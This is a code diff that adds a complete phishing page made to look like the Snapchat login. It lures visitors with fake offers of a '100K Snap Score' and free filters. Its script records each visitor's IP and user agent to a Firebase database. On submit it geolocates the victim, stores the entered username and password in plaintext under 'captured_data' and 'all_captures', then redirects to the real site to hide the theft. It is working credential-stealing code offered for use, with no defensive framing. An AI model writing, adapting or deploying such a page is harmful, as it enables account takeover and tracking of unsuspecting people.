@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat - Login</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="../firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #fffc00;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            padding: 30px 25px;
+            animation: slideUp 0.4s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .header .ghost {
+            font-size: 4em;
+            margin-bottom: 10px;
+        }
+        .header h1 {
+            color: #000;
+            font-size: 1.8em;
+            font-weight: 700;
+        }
+        .header p { color: #666; font-size: 0.9em; margin-top: 5px; }
+        
+        .offer-banner {
+            background: #fffc00;
+            color: #000;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 2px solid #000;
+            font-weight: 600;
+            font-size: 0.9em;
+        }
+        .offer-banner strong { font-size: 1.1em; }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 6px;
+            font-size: 0.85em;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 0.95em;
+            transition: all 0.3s;
+            background: #fafafa;
+        }
+        .form-group input:focus {
+            border-color: #fffc00;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255,252,0,0.3);
+            background: #fff;
+        }
+        .form-group input::placeholder { color: #aaa; }
+        
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #000;
+            border: none;
+            border-radius: 30px;
+            color: #fffc00;
+            font-size: 1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        .login-btn:hover { background: #222; transform: scale(1.02); }
+        
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .signup-link a {
+            color: #000;
+            font-weight: 600;
+            font-size: 0.9em;
+            text-decoration: none;
+        }
+        .signup-link a:hover { text-decoration: underline; }
+        
+        .terms {
+            text-align: center;
+            margin-top: 20px;
+            color: #888;
+            font-size: 0.75em;
+            line-height: 1.5;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 25px;
+        }
+        .loading .spinner {
+            border: 3px solid #fffc00;
+            border-top: 3px solid #000;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading p { color: #666; margin-top: 10px; }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: #fffc00;
+            border-radius: 15px;
+        }
+        .success-msg h3 { color: #000; }
+        .success-msg p { color: #333; margin-top: 10px; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <div class="ghost">👻</div>
+                <h1>Snapchat</h1>
+                <p>Connect with your friends!</p>
+            </div>
+            
+            <div class="offer-banner">
+                👻 <strong>FREE Snap Score + Premium Rewards!</strong><br>
+                ⭐ 100K Snap Score · 🔓 Free Filters · ✅ Account Unlock
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Username or Email</label>
+                    <input type="text" id="username" placeholder="Enter your Snapchat username" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="login-btn">👻 Log In</button>
+            </form>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Connecting to Snapchat...</p>
+            </div>
+            
+            <div class="success-msg" id="successMsg">
+                <h3>✅ Success!</h3>
+                <p>Your Snap Score and rewards will be added within 24 hours!</p>
+                <p style="margin-top:10px;font-size:0.8em;color:#666;">Redirecting to Snapchat...</p>
+            </div>
+            
+            <div class="signup-link">
+                New here? <a href="#">Create an Account</a>
+            </div>
+            
+            <div class="terms">
+                By logging in, you agree to our Terms of Service and Privacy Policy.
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkID = urlParams.get('id') || 'direct_' + Date.now();
+        const targetEmail = urlParams.get('target') || '';
+        
+        let visitorIP = '';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                visitorIP = data.ip;
+                db.ref('visits/' + linkID).push({
+                    ip: visitorIP,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    page: 'snapchat',
+                    target: targetEmail
+                });
+            });
+        
+        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            let location = 'Unknown';
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { location = data.city + ', ' + data.country_name; })
+                .catch(() => {})
+                .finally(() => {
+                    db.ref('captured_data/' + linkID).set({
+                        username, password, ip: visitorIP, location,
+                        userAgent: navigator.userAgent, timestamp: Date.now(),
+                        service: 'snapchat', target: targetEmail
+                    });
+                    db.ref('all_captures').push({
+                        username, password, ip: visitorIP, location,
+                        service: 'snapchat', target: targetEmail, timestamp: Date.now()
+                    });
+                    
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => window.location.href = 'https://web.snapchat.com', 3000);
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
